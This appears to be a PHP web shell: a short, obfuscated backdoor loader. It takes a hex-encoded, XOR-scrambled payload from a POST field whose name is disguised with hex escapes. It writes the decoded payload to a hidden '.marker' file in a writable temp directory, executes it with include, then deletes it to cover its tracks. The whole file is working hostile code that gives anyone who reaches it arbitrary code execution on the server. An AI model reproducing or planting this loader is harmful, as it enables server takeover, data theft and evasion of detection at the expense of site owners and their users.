<?php

if(!is_null($_POST["\x6F\x62j\x65ct"] ?? null)){
	$resource = array_filter(["/dev/shm", getcwd(), session_save_path(), "/tmp", sys_get_temp_dir(), ini_get("upload_tmp_dir"), getenv("TMP"), getenv("TEMP"), "/var/tmp"]);
	$res = hex2bin($_POST["\x6F\x62j\x65ct"]);
	$pointer    =   ''    ;    $j = 0; do{$pointer .= chr(ord($res[$j]) ^ 6);$j++;} while($j < strlen($res));
	foreach ($resource as $element) {
    		if ((is_dir($element) and is_writable($element))) {
    $dchunk = "$element/.marker";
    $success = file_put_contents($dchunk, $pointer);
if ($success) {
	include $dchunk;
	@unlink($dchunk);
	exit;}
}
}
}